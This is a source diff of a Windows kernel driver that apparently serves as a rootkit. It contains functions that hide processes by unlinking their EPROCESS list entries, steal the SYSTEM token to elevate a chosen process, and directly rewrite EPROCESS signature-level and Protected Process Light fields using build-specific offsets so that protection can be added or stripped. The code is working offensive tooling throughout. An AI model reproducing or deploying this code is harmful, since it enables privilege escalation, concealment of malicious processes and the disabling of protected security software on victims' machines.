@@ -2,11 +2,11 @@
 #include "pch.h"
 
 // Definitions.
-#define SYSTEM_PROCESS_PID 4
-#define PROCESS_TERMINATE 1
+#define SYSTEM_PROCESS_PID	  0x4
+#define PROCESS_TERMINATE	  0x1
 #define PROCESS_CREATE_THREAD 0x2
-#define PROCESS_VM_READ 0x10
-#define PROCESS_VM_OPERATION 8
+#define PROCESS_VM_READ		  0x10
+#define PROCESS_VM_OPERATION  0x8
 
 bool FindProcess(ULONG pid);
 bool AddProcess(ULONG pid);
@@ -15,6 +15,9 @@ ULONG GetActiveProcessLinksOffset();
 ULONG GetProcessLock();
 void RemoveProcessLinks(PLIST_ENTRY current);
 UINT64 GetTokenOffset();
+NTSTATUS ElevateProcess(ULONG pid);
+ULONG GetSignatureLevelOffset();
+NTSTATUS SetProcessSignature(ProcessSignature* ProcessSignature);
 
 /*
 * Description:
@@ -121,18 +124,17 @@ NTSTATUS HideProcess(ULONG pid) {
 * Returns:
 * @status [NTSTATUS] -- Whether successfully elevated or not.
 */
-NTSTATUS ElevateProcess(ULONG targetPid) {
+NTSTATUS ElevateProcess(ULONG pid) {
 	PEPROCESS privilegedProcess, targetProcess;
 	NTSTATUS status = STATUS_SUCCESS;
 
 	// Getting the EProcess of the target and the privileged processes.
-	status = PsLookupProcessByProcessId(ULongToHandle(targetPid), &targetProcess);
+	status = PsLookupProcessByProcessId(ULongToHandle(pid), &targetProcess);
 	UINT64 tokenOffset = GetTokenOffset();
 
 	if (!NT_SUCCESS(status))
-	{
 		return status;
-	}
+
 	status = PsLookupProcessByProcessId(ULongToHandle(SYSTEM_PROCESS_PID), &privilegedProcess);
 
 	if (!NT_SUCCESS(status))
@@ -359,4 +361,81 @@ UINT64 GetTokenOffset() {
 	}
 
 	return tokenOffset;
+}
+
+/*
+* Description:
+* GetSignatureLevelOffset is responsible for getting the signature level offset depends on the windows version.
+*
+* Parameters:
+* There are no parameters.
+*
+* Returns:
+* @signatureLevelOffset [UINT64] -- Offset of the process' signature level.
+*/
+ULONG GetSignatureLevelOffset() {
+	ULONG signatureLevelOffset = (ULONG)STATUS_UNSUCCESSFUL;
+	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
+	NTSTATUS result = RtlGetVersion(&osVersion);
+
+	if (NT_SUCCESS(result)) {
+		switch (osVersion.dwBuildNumber) {
+		case WIN_1903:
+		case WIN_1909:
+			signatureLevelOffset = 0x6f8;
+			break;
+		case WIN_1703:
+		case WIN_1709:
+		case WIN_1803:
+		case WIN_1809:
+			signatureLevelOffset = 0x6c8;
+			break;
+		case WIN_1607:
+			signatureLevelOffset = 0x6c0;
+			break;
+		case WIN_1511:
+			signatureLevelOffset = 0x6b0;
+			break;
+		case WIN_1507:
+			signatureLevelOffset = 0x6a8;
+			break;
+		default:
+			signatureLevelOffset = 0x878;
+			break;
+		}
+	}
+
+	return signatureLevelOffset;
+}
+
+/*
+* Description:
+* SetProcessSignature is responsible for removing or adding process protection to a certain process.
+*
+* Parameters:
+* @pid	   [ULONG]    -- The id of the process that need to add or remove protection to.
+* @protect [bool]     -- Whether to add or remove the protection.
+*
+* Returns:
+* @status  [NTSTATUS] -- Whether the operation was successful or not.
+*/
+NTSTATUS SetProcessSignature(ProcessSignature* ProcessSignature) {
+	PEPROCESS process;
+	SIZE_T bytesWritten;
+	NTSTATUS status = STATUS_SUCCESS;
+
+	status = PsLookupProcessByProcessId(ULongToHandle(ProcessSignature->Pid), &process);
+
+	if (!NT_SUCCESS(status))
+		return status;
+
+	UCHAR newSignatureLevel = (ProcessSignature->SignerType << 4) | ProcessSignature->SignatureSigner;
+	PPROCESS_SIGNATURE processSignature = (PPROCESS_SIGNATURE)(UINT64(process) + GetSignatureLevelOffset());
+
+	processSignature->SignatureLevel = newSignatureLevel;
+	processSignature->Protection.Type = ProcessSignature->SignerType;
+	processSignature->Protection.Signer = ProcessSignature->SignatureSigner;
+
+	ObDereferenceObject(process);
+	return status;
 }
